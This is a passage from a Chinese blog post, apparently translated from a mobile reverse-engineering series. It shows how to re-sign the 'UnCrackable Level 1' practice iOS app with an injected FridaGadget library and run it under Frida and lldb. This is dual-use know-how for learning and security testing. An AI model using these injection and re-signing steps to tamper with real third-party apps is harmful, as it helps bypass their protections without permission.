<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> rm -rf Payload/F/_CodeSignature</div><div class="line"><span class="meta">$</span> /usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 Payload/UnCrackable\ Level\ 1.app/FridaGadget.dylib</div><div class="line">Payload/UnCrackable Level 1.app/FridaGadget.dylib: replacing existing signature</div><div class="line"><span class="meta">$</span> /usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plist Payload/UnCrackable\ Level\ 1.app/UnCrackable\ Level\ 1</div><div class="line">Payload/UnCrackable Level 1.app/UnCrackable Level 1: replacing existing signature</div></pre></td></tr></table></figure>
<h4 id="安装并运行应用"><a href="#安装并运行应用" class="headerlink" title="安装并运行应用"></a>安装并运行应用</h4><p>现在你可以开始部署并运行修改后的app了，如下操作：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> ios-deploy --debug --bundle Payload/UnCrackable\ Level\ 1.app/</div></pre></td></tr></table></figure>
<p>如果一切顺利的话，app应该会附加<strong>lldb</strong>并以调试模式运行在设备上。Frida现在也附加到应用上了，可是使用<strong>frida-ps</strong>命令来验证一下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> frida-ps -U</div><div class="line">PID Name</div><div class="line">--- ------</div><div class="line">499 Gadget</div></pre></td></tr></table></figure>
<p>现在你可以使用Frida来正常调试你的应用了！</p>
<h4 id="故障排除"><a href="#故障排除" class="headerlink" title="故障排除"></a>故障排除</h4><p>如果发生什么错误，有可能是配置文件和代码签名头不匹配，这种情况建议阅读一下<a href="https://developer.apple.com/library/content/documentation/IDEs/Conceptual/AppDistributionGuide/MaintainingProfiles/MaintainingProfiles.html" target="_blank" rel="external">官方文档</a>，了解一下整个系统是如何运行的。另外还可以参考<a href="http://https//developer.apple.com/library/content/technotes/tn2415/_index.html" target="_blank" rel="external">苹果授权故障排除</a>这个页面。</p>
<h4 id="关于这篇文件"><a href="#关于这篇文件" class="headerlink" title="关于这篇文件"></a>关于这篇文件</h4><p>这篇文章是<a href="safari-reader://www.vantagepoint.sg/blog/83-mobile-reverse-engineering-unleashed" target="_blank" rel="external">Mobile Reverse Engineering Unleashed</a>的系列之一。你可以访问<a href="http://www.vantagepoint.sg/blog/categories/17-mobile-reverse-engineering" target="_blank" rel="external">这里</a>来查看更多相关文章。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="Chensh" />
          <p class="site-author-name" itemprop="name">Chensh</p>
           
              <p class="site-description motion-element" itemprop="description">举眉间仲夏，绿荫里蝉鸣</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">6</span>
                <span class="site-state-item-name">Artikel</span>
              </a>
            </div>
          

          

          
            
            
            <div class="site-state-item site-state-tags">
              
                <span class="site-state-item-count">3</span>
                <span class="site-state-item-name">Tags</span>
              
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Chensh</span>
</div>


<div class="powered-by">
  Erstellt mit  <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  





  

  

  

  

  

  

</body>
</html>
